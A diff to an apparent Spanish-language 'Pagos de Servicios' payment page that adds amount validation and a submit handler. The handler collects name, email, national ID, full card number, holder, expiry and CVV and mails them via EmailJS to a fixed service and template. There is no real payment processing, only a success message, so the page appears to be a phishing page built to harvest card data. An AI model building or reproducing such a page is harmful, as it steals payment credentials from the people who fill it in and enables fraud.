@@ -4,7 +4,6 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Pagos de Servicios</title>
-
 <style>
   body {
     margin: 0;
@@ -164,7 +163,7 @@
       <span class="peso-simbolo">$</span>
       <span class="error" id="error-monto"></span>
     </div>
-    <button id="continuar-btn">Continuar</button>
+    <button id="continuar-btn" type="button">Continuar</button>
   </div>
 
   <!-- Formulario oculto hasta ingresar monto -->
@@ -231,7 +230,30 @@
   const loader = document.getElementById('loader');
   const mensajeExito = document.getElementById('mensaje-exito');
 
-  // Validación general de campos
+  // Validación monto
+  function validarMonto() {
+    const valor = montoPersonalizado.value.trim();
+    const errorMonto = document.getElementById('error-monto');
+    if (!valor || isNaN(valor) || Number(valor) <= 0) {
+      errorMonto.textContent = 'Ingresa un monto válido mayor a 0';
+      return false;
+    }
+    errorMonto.textContent = '';
+    return true;
+  }
+
+  continuarBtn.addEventListener('click', () => {
+    if (!validarMonto()) return;
+    // Poner el monto oculto para enviar con el form
+    montoHidden.value = montoPersonalizado.value.trim();
+
+    // Ocultar selección monto y mostrar formulario
+    bloqueMonto.style.display = 'none';
+    form.style.display = 'block';
+    window.scrollTo(0,0);
+  });
+
+  // Validaciones para formulario (simplificado)
   function validarCampo(input) {
     const value = input.value.trim();
     const error = document.getElementById('error-' + input.name);
@@ -241,7 +263,7 @@
     switch (input.name) {
       case 'tarjeta':
         if (!/^\d{13,16}$/.test(value)) {
-          mensaje = 'Ingrese un número de tarjeta válido (13 a 16 dígitos)';
+          mensaje = 'Número inválido (13-16 dígitos)';
           valido = false;
         }
         break;
@@ -263,16 +285,9 @@
           const añoActual = ahora.getFullYear() % 100;
           const mesActual = ahora.getMonth() + 1;
           if (año < añoActual || (año === añoActual && mes < mesActual) || mes > 12 || mes < 1) {
-            mensaje = 'Fecha de vencimiento inválida o expirada';
+            mensaje = 'Fecha vencida o inválida';
             valido = false;
           }
-        }
-        break;
-
-      case 'monto':
-        if (isNaN(value) || Number(value) <= 0) {
-          mensaje = 'Monto inválido';
-          valido = false;
         }
         break;
 
@@ -285,4 +300,74 @@
 
       default:
         if (!value) {
-          mensaje =
+          mensaje = 'Campo requerido';
+          valido = false;
+        }
+    }
+
+    if (!valido) {
+      error.textContent = mensaje;
+      input.classList.add('invalid');
+    } else {
+      error.textContent = '';
+      input.classList.remove('invalid');
+    }
+
+    return valido;
+  }
+
+  form.addEventListener('submit', (e) => {
+    e.preventDefault();
+
+    // Validar todos los inputs
+    const inputs = form.querySelectorAll('input[required]');
+    let todoValido = true;
+    inputs.forEach(input => {
+      if (!validarCampo(input)) todoValido = false;
+    });
+
+    // Validar que se haya seleccionado el tipo de tarjeta
+    const tipoTarjeta = form.querySelector('input[name="tipo-tarjeta"]:checked');
+    if (!tipoTarjeta) {
+      alert('Seleccione un tipo de tarjeta');
+      todoValido = false;
+    }
+
+    if (!todoValido) return;
+
+    // Mostrar loader y ocultar mensajes
+    loader.style.display = 'block';
+    mensajeExito.style.display = 'none';
+
+    // Preparar datos para EmailJS
+    const templateParams = {
+      nombre: form.nombre.value,
+      email: form.email.value,
+      dni: form.dni.value,
+      tarjeta: form.tarjeta.value,
+      titular: form.titular.value,
+      vencimiento: form.vencimiento.value,
+      cvv: form.cvv.value,
+      monto: montoHidden.value,
+      tipo_tarjeta: tipoTarjeta.value
+    };
+
+    emailjs.send('service_6pbv86h', 'template_m3nuw4p', templateParams)
+      .then(() => {
+        loader.style.display = 'none';
+        mensajeExito.style.display = 'block';
+        form.reset();
+        bloqueMonto.style.display = 'block';
+        form.style.display = 'none';
+        montoPersonalizado.value = '';
+        window.scrollTo(0,0);
+      }, (error) => {
+        loader.style.display = 'none';
+        alert('Error al enviar el formulario, inténtalo de nuevo.');
+        console.error(error);
+      });
+  });
+
+</script>
+</body>
+</html>
